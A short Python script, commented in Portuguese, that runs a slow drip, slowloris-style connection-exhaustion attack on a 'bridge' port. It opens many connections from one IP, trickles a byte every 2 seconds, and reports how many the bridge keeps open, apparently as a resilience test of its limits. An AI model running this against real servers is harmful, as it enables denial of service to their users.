#!/usr/bin/env python3
"""Ataque de gotejamento a porta da ponte: abre N conexoes de um IP so e
manda um byte a cada 2 s em cada uma, sem nunca completar o aperto. Imprime,
passados SEGUNDOS, quantas a ponte ainda deixa abertas.

Uso: goteja.py HOST PORTA N SEGUNDOS
"""
import socket, sys, time

host, porta, n, dur = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), float(sys.argv[4])
abertas = []
for _ in range(n):
    try:
        abertas.append(socket.create_connection((host, porta), timeout=2))
    except OSError:
        pass
fim = time.time() + dur
while time.time() < fim:
    vivas = []
    for s in abertas:
        try:
            s.send(b"\x00")
            vivas.append(s)
        except OSError:
            s.close()
    abertas = vivas
    time.sleep(2)
# Uma ultima conferencia: fechada pelo outro lado le 0.
vivas = 0
for s in abertas:
    s.setblocking(False)
    try:
        vivas += 0 if s.recv(1) == b"" else 1
    except BlockingIOError:
        vivas += 1
    except OSError:
        pass
print(vivas, flush=True)
